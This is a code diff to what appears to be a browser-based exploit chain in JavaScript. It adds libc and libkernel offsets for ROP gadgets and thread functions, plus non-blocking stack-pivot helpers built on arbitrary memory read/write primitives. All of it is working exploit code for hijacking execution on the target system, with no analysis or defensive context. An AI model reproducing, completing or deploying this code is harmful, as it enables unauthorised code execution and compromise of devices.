@@ -7,8 +7,13 @@ var libkernel_base = read_ptr_at(webkit_base + 0x28f9d70) - 0x33580;
 var libc_base = read_ptr_at(webkit_base + 0x28f9d38) - 0x148f0;
 
 var thread_list = libkernel_base + 0x601a8;
+var loadall_addr = libc_base + 0x435f8;
+var saveall_addr = libc_base + 0x43674;
 var pivot_addr = libc_base + 0x4366e;
 var infloop_addr = webkit_base + 0x109e1;
+var pthread_exit_addr = libkernel_base + 0x20a80;
+var pthread_create_addr = libkernel_base + 0x2d450;
+var get_errno_addr_addr = libkernel_base + 0x1d2a0;
 
 function find_worker()
 {
@@ -59,5 +64,35 @@ function pivot(buf)
 {
     write_ptr_at(buf, spin_table-24);
     write_ptr_at(spin_table+24, buf+8);
-    while(read_ptr_at(spin_table+24) != spin_table+16);
+    var q = 0;
+    while((q = read_ptr_at(spin_table+24)) != spin_table+16);
+}
+
+/* NON-BLOCKING API
+
+These functions are the same, except that they never block.
+*/
+function pivot_start(buf)
+{
+    //returns immediately
+    write_ptr_at(buf, spin_table-24);
+    write_ptr_at(spin_table+24, buf+8);
+}
+
+function pivot_has_finished()
+{
+    return read_ptr_at(spin_table+24) == spin_table+16;
+}
+
+function pivot_cb(buf, callback)
+{
+    pivot_start(buf);
+    var wait = function()
+    {
+        if(pivot_has_finished())
+            callback();
+        else
+            setTimeout(wait, 100);
+    };
+    wait();
 }
